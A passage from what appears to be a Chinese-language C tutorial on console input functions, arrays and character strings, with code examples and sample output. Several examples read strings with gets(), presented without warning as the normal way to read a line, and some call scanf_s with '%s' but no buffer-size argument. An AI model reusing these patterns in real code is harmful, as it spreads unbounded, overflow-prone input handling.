<li>gets()：获取一行数据，并作为字符串处理。</li>
</ul>
<p>scanf() 是最灵活、最复杂、最常用的输入函数，但它不能完全取代其他函数。</p>
<h4 id="内存中存放的格式"><a href="#内存中存放的格式" class="headerlink" title="内存中存放的格式"></a>内存中存放的格式</h4><p>数据是以二进制的形式保存在内存中的，字节（Byte）是最小的可操作单位。为了便于管理，我们给每个字节分配了一个编号，使用该字节时，只要知道编号就可以，就像每个学生都有学号，老师会随机抽取学号来让学生回答问题。字节的编号是有顺序的，从 0 开始，接下来是 1、2、3……</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/1045231316-0.png" alt="img" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126170159598.png" alt="image-20240126170159598" style="zoom:67%;" />

<p><code>%p</code>是一个新的格式控制符，它表示以十六进制的形式（带小写的前缀）输出数据的地址。如果写作<code>%P</code>，那么十六进制的前缀也将变成大写形式。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/10452364L-1.png" alt="img" style="zoom:80%;" />

<h4 id="输入与缓冲区的关系"><a href="#输入与缓冲区的关系" class="headerlink" title="输入与缓冲区的关系"></a>输入与缓冲区的关系</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    scanf_s(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>, a + b);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d   %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>, a + b);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d, %d, %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b+c=%d\n&quot;</span>, a + b + c);</span><br><span class="line"></span><br><span class="line">    scanf_s(<span class="string">&quot;%d is bigger than %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a-b=%d\n&quot;</span>, a - b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们一个一个地输入变量 a、b、c、d 的值，每输入一个值就按一次回车键。现在我们改变输入方式，将四个变量的值一次性输入，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12 60 10 23↙</span><br><span class="line">a+b=72</span><br><span class="line">c*d=230</span><br></pre></td></tr></table></figure>

<p>可以发现，两个 scanf() 都能正确读取。合情合理的猜测是，第一个 scanf() 读取完毕后没有抛弃多余的值，而是将它们保存在了某个地方，下次接着使用。</p>
<blockquote>
<p><strong>从本质上讲，我们从键盘输入的数据并没有直接交给 scanf()，而是放入了缓冲区中，直到我们按下回车键，scanf() 才到缓冲区中读取数据。如果缓冲区中的数据符合 scanf() 的要求，那么就读取结束；如果不符合要求，那么就继续等待用户输入，或者干脆读取失败。</strong></p>
</blockquote>
<h4 id="输入字符和字符串所有函数汇总"><a href="#输入字符和字符串所有函数汇总" class="headerlink" title="输入字符和字符串所有函数汇总"></a>输入字符和字符串所有函数汇总</h4><h4 id="输入单个字符"><a href="#输入单个字符" class="headerlink" title="输入单个字符"></a><strong>输入单个字符</strong></h4><h5 id="getchar"><a href="#getchar" class="headerlink" title="getchar()"></a>getchar()</h5><p>最容易理解的字符输入函数是 getchar()，它就是<code>scanf(&quot;%c&quot;, c)</code>的替代品，除了更加简洁，没有其它优势了；或者说，getchar() 就是 scanf() 的一个简化版本。</p>
<h5 id="getche-：windows特有函数"><a href="#getche-：windows特有函数" class="headerlink" title="getche()：windows特有函数"></a>getche()：windows特有函数</h5><p>getche() 就比较有意思了，它没有缓冲区，输入一个字符后会立即读取，不用等待用户按下回车键，这是它和 scanf()、getchar() 的最大区别。请看下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char c = getche();</span><br><span class="line">    printf(&quot;c: %c\n&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="getche-：Windows特有函数"><a href="#getche-：Windows特有函数" class="headerlink" title="getche()：Windows特有函数"></a>getche()：Windows特有函数</h5><p>getch() 也没有缓冲区，输入一个字符后会立即读取，不用按下回车键，这一点和 getche() 相同。getch() 的特别之处是它没有回显，看不到输入的字符。所谓回显，就是在控制台上显示出用户输入的字符；没有回显，就不会显示用户输入的字符，就好像根本没有输入一样。回显在大部分情况下是有必要的，它能够与用户及时交互，让用户清楚地看到自己输入的内容。但在某些特殊情况下，我们却不希望有回显，例如输入密码，有回显是非常危险的，容易被偷窥。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126171440826.png" alt="image-20240126171440826" style="zoom:80%;" />

<h4 id="输入字符串"><a href="#输入字符串" class="headerlink" title="输入字符串"></a>输入字符串</h4><h5 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h5><p>输入字符串当然可以使用 scanf() 这个通用的输入函数，对应的格式控制符为<code>%s</code>，上节已经讲到了；本节我们重点讲解的是 gets() 这个专用的字符串输入函数，它拥有一个 scanf() 不具备的特性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> author[<span class="number">30</span>], lang[<span class="number">30</span>], url[<span class="number">30</span>];</span><br><span class="line">    gets(author);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;author: %s\n&quot;</span>, author);</span><br><span class="line">    gets(lang);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lang: %s\n&quot;</span>, lang);</span><br><span class="line">    gets(url);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;url: %s\n&quot;</span>, url);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets() 是有缓冲区的，每次按下回车键，就代表当前输入结束了，gets() 开始从缓冲区中读取内容，这一点和 scanf() 是一样的。gets() 和 scanf() 的主要区别是：</p>
<ul>
<li>scanf() 读取字符串时以<strong>空格为分隔</strong>，遇到空格就认为当前字符串结束了，所以无法读取含有空格的字符串。</li>
<li>gets() 认为<strong>空格也是字符串的一部分</strong>，只有遇到回车键时才认为字符串输入结束，所以，不管输入了多少个空格，只要不按下回车键，对 gets() 来说就是一个完整的字符串。</li>
</ul>
<p>也就是说，gets() 能读取含有空格的字符串，而 scanf() 不能。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组的内存结构"><a href="#数组的内存结构" class="headerlink" title="数组的内存结构"></a>数组的内存结构</h3><p>数组是一个整体，它的内存是连续的；也就是说，数组元素之间是相互挨着的，彼此之间没有一点点缝隙。下图演示了<code>int a[4];</code>在内存中的存储情形：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/101402I50-0.png" alt="img" style="zoom:80%;" />

<p>「数组内存是连续的」这一点很重要，所以我使用了一个大标题来强调。连续的内存为<a target="_blank" rel="noopener" href="https://c.biancheng.net/c/80/">指针</a>操作（通过指针来访问数组元素）和内存处理（整块内存的复制、写入等）提供了便利，这使得数组可以作为缓存（临时存储数据的一块内存）使用。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ol>
<li>可以只给部分元素赋值。当<code>&#123; &#125;</code>中值的个数少于元素个数时，只给前面部分元素赋值。例如：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=&#123;<span class="number">12</span>, <span class="number">19</span>, <span class="number">22</span> , <span class="number">993</span>, <span class="number">344</span>&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>只能给元素逐个赋值，不能给数组整体赋值。例如给 10 个元素全部赋值为 1，只能写作：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>如给全部元素赋值，那么在定义数组时可以不给出数组长度。例如：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>如果只初始化部分数组元素，那么剩余的数组元素也会自动初始化为“零”值，所以我们只需要将 str 的第 0 个元素赋值为 0，剩下的元素就都是 0 了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="判断数组中是否包含某个元素"><a href="#判断数组中是否包含某个元素" class="headerlink" title="判断数组中是否包含某个元素"></a>判断数组中是否包含某个元素</h3><p>在实际开发中，经常需要查询数组中的元素。例如，学校为每位同学分配了一个唯一的编号，现在有一个数组，保存了实验班所有同学的编号信息，如果有家长想知道他的孩子是否进入了实验班，只要提供孩子的编号就可以，如果编号和数组中的某个元素相等，就进入了实验班，否则就没进入。</p>
<p>不幸的是，C语言标准库没有提供与数组查询相关的函数，所以我们只能自己编写代码。</p>
<h4 id="无序数组查询"><a href="#无序数组查询" class="headerlink" title="无序数组查询"></a>无序数组查询</h4><p>所谓无序数组，就是数组元素的排列没有规律。无序数组元素查询的思路也很简单，就是用循环遍历数组中的每个元素，把要查询的值挨个比较一遍。请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">296</span>, <span class="number">177</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">34</span>, <span class="number">999</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, num, thisindex = <span class="number">-1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input an integer: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == num)&#123;</span><br><span class="line">            thisindex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(thisindex &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d isn&#x27;t  in the array.\n&quot;</span>, num);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is  in the array, it&#x27;s index is %d.\n&quot;</span>, num, thisindex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240126172627339.png" alt="image-20240126172627339" style="zoom: 67%;" />

<h4 id="有序数组查询"><a href="#有序数组查询" class="headerlink" title="有序数组查询"></a>有序数组查询</h4><p>查询无序数组需要遍历数组中的所有元素，而查询有序数组只需要遍历其中一部分元素。例如有一个长度为 10 的整型数组，它所包含的元素按照从小到大的顺序（升序）排列，假设比较到第 4 个元素时发现它的值大于输入的数字，那么剩下的 5 个元素就没必要再比较了，肯定也大于输入的数字，这样就减少了循环的次数，提高了执行效率。</p>
<p>请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">34</span>, <span class="number">100</span>, <span class="number">177</span>, <span class="number">296</span>, <span class="number">999</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, num, thisindex = <span class="number">-1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input an integer: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] == num)&#123;</span><br><span class="line">            thisindex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i] &gt; num)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(thisindex &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d isn&#x27;t  in the array.\n&quot;</span>, num);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is  in the array, it&#x27;s index is %d.\n&quot;</span>, num, thisindex);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符数组和字符串详解"><a href="#字符数组和字符串详解" class="headerlink" title="字符数组和字符串详解"></a>字符数组和字符串详解</h3><p>用来存放字符的数组称为<strong>字符数组</strong>，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">10</span>];  <span class="comment">//一维字符数组</span></span><br><span class="line"><span class="type">char</span> b[<span class="number">5</span>][<span class="number">10</span>];  <span class="comment">//二维字符数组</span></span><br><span class="line"><span class="type">char</span> c[<span class="number">20</span>]=&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;m&#x27;</span>&#125;;  <span class="comment">// 给部分数组元素赋值</span></span><br><span class="line"><span class="type">char</span> d[]=&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span> &#125;;  <span class="comment">//对全体元素赋值时可以省去长度</span></span><br></pre></td></tr></table></figure>

<p>字符数组实际上是一系列字符的集合，也就是<strong>字符串（String）</strong>。在C语言中，没有专门的字符串变量，没有string类型，通常就用一个字符数组来存放一个字符串。</p>
<p>C语言规定，可以将字符串直接赋值给字符数组，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">30</span>] = &#123;<span class="string">&quot;c.biancheng.net&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> str[<span class="number">30</span>] = <span class="string">&quot;c.biancheng.net&quot;</span>;  <span class="comment">//这种形式更加简洁，实际开发中常用</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h3><p>在C语言中，字符串总是以<code>&#39;\0&#39;</code>作为结尾，所以<code>&#39;\0&#39;</code>也被称为字符串结束标志，或者字符串结束符。</p>
<blockquote>
<p><code>&#39;\0&#39;</code>是 ASCII 码表中的第 0 个字符，英文称为 NUL，中文称为“空字符”。该字符既不能显示，也没有控制功能，输出该字符不会有任何效果，它在C语言中唯一的作用就是作为字符串结束标志。</p>
</blockquote>
<p>由<code>&quot; &quot;</code>包围的字符串会自动在末尾添加<code>&#39;\0&#39;</code>。例如，<code>&quot;abc123&quot;</code>从表面看起来只包含了 6 个字符，其实不然，C语言会在最后隐式地添加一个<code>&#39;\0&#39;</code>，这个过程是在后台默默地进行的，所以我们感受不到。</p>
<p>下图演示了<code>&quot;C program&quot;</code>在内存中的存储情形：</p>
<p><img src= "/img/friend_404.gif" data-lazy-src="/image/103521G44-0.png" alt="img"></p>
<p>需要注意的是，逐个字符地给数组赋值并不会自动添加<code>&#39;\0&#39;</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char str[] = &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;;</span><br></pre></td></tr></table></figure>

<p>数组 str 的长度为 3，而不是 4，因为最后没有<code>&#39;\0&#39;</code>。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240131173936688.png" alt="image-20240131173936688" style="zoom: 67%;" />

<p>当用字符数组存储字符串时，要特别注意<code>&#39;\0&#39;</code>，要为<code>&#39;\0&#39;</code>留个位置；这意味着，字符数组的长度至少要比字符串的长度大 1。请看下面的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char str[7] = &quot;abc123&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;abc123&quot;</code>看起来只包含了 6 个字符，我们却将 str 的长度定义为 7，就是为了能够容纳最后的<code>&#39;\0&#39;</code>。如果将 str 的长度定义为 6，它就无法容纳<code>&#39;\0&#39;</code>了。</p>
<blockquote>
<p>当字符串长度大于数组长度时，有些较老或者不严格的编译器并不会报错，甚至连警告都没有，这就为以后的错误埋下了伏笔，读者自己要多多注意。</p>
</blockquote>
<p>有些时候，程序的逻辑要求我们必须逐个字符地为数组赋值，这个时候就很容易遗忘字符串结束标志<code>&#39;\0&#39;</code>。下面的代码中，我们将 26 个大写英文字符存入字符数组，并以字符串的形式输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">30</span>];</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(c=<span class="number">65</span>,i=<span class="number">0</span>; c&lt;=<span class="number">90</span>; c++,i++)&#123;</span><br><span class="line">        str[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 VS2015 下的运行结果：</p>
<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ口口口口i口口0 ?</p>
<p><code>口</code>表示无法显示的特殊字符。</p>
<blockquote>
<p>在函数内部定义的变量、数组、结构体、共用体等都称为局部数据。在很多编译器下，局部数据的初始值都是随机的、无意义的，而不是我们通常认为的“零”值。这一点非常重要，大家一定要谨记，否则后面会遇到很多奇葩的错误。</p>
</blockquote>
<blockquote>
<p>本例中的 str 数组在定义完成以后并没有立即初始化，所以它所包含的元素的值都是随机的，只有很小的概率会是“零”值。循环结束以后，str 的前 26 个元素被赋值了，剩下的 4 个元素的值依然是随机的，不知道是什么。</p>
</blockquote>
<h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><p>所谓字符串长度，就是字符串包含了多少个字符（不包括最后的结束符<code>&#39;\0&#39;</code>）。例如<code>&quot;abc&quot;</code>的长度是 3，而不是 4。</p>
<p>在C语言中，我们使用<code>string.h</code>头文件中的 strlen() 函数来求字符串的长度，它的用法为：</p>
<p>length strlen(strname);</p>
<p>strname 是字符串的名字，或者字符数组的名字；length 是使用 strlen() 后得到的字符串长度，是一个整数。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240131174909524.png" alt="image-20240131174909524" style="zoom:67%;" />

<h3 id="字符串输入输出"><a href="#字符串输入输出" class="headerlink" title="字符串输入输出"></a>字符串输入输出</h3><p><strong>输入</strong></p>
<p>在C语言中，有两个函数可以让用户从键盘上输入字符串，它们分别是：</p>
<ul>
<li>scanf()：通过格式控制符<code>%s</code>输入字符串。除了字符串，scanf() 还能输入其他类型的数据。</li>
<li>gets()：直接输入字符串，并且只能输入字符串。</li>
</ul>
<p>但是，scanf() 和 gets() 是有区别的：</p>
<ul>
<li>scanf() 读取字符串时以空格为分隔，遇到空格就认为当前字符串结束了，所以无法读取含有空格的字符串。</li>
<li>gets() 认为空格也是字符串的一部分，只有遇到回车键时才认为字符串输入结束，所以，不管输入了多少个空格，只要不按下回车键，对 gets() 来说就是一个完整的字符串。换句话说，gets() 用来读取一整行字符串。</li>
</ul>
<p><strong>例子</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str2[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> str3[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//gets() 用法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a string: &quot;</span>);</span><br><span class="line">    gets(str1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//scanf() 用法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a string: &quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%s&quot;</span>, str2);</span><br><span class="line">    scanf_s(<span class="string">&quot;%s&quot;</span>, str3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nstr1: %s\n&quot;</span>, str1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str2: %s\n&quot;</span>, str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str3: %s\n&quot;</span>, str3);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input a string: C C++ Java Python↙</span><br><span class="line">Input a string: PHP JavaScript↙</span><br><span class="line"></span><br><span class="line">str1: C C++ Java Python</span><br><span class="line">str2: PHP</span><br><span class="line">str3: JavaScript</span><br></pre></td></tr></table></figure>

<p>第一次输入的字符串被 gets() 全部读取，并存入 str1 中。第二次输入的字符串，前半部分被第一个 scanf() 读取并存入 str2 中，后半部分被第二个 scanf() 读取并存入 str3 中。</p>
<blockquote>
<p>注意，scanf() 在读取数据时需要的是数据的地址，这一点是恒定不变的，所以对于 int、char、float 等类型的变量都要在前边添加<code>&amp;</code>以获取它们的地址。但是在本段代码中，我们只给出了字符串的名字，却没有在前边添加<code>&amp;</code>，这是为什么呢？因为<strong>字符串名字或者数组名字在使用的过程中一般都会转换为地址</strong>，所以再添加<code>&amp;</code>就是多此一举，甚至会导致错误了。</p>
<p>就目前学到的知识而言，int、char、float 等类型的变量用于 scanf() 时都要在前面添加<code>&amp;</code>，而数组或者字符串用于 scanf() 时不用添加<code>&amp;</code>，它们本身就会转换为地址。读者一定要谨记这一点。</p>
</blockquote>
<h4 id="其实-scanf-也可以读取带空格的字符串"><a href="#其实-scanf-也可以读取带空格的字符串" class="headerlink" title="其实 scanf() 也可以读取带空格的字符串"></a>其实 scanf() 也可以读取带空格的字符串</h4><p>以上是 scanf() 和 gets() 的一般用法，很多教材也是这样讲解的，所以大部分初学者都认为 scanf() 不能读取包含空格的字符串，不能替代 gets()。其实不然，scanf() 的用法还可以更加复杂和灵活，它不但可以完全替代 gets() 读取一整行字符串，而且比 gets() 的功能更加强大。比如，以下功能都是 gets() 不具备的：</p>
<ul>
<li>scanf() 可以控制读取字符的数目；</li>
<li>scanf() 可以只读取指定的字符；</li>
<li>scanf() 可以不读取某些字符；</li>
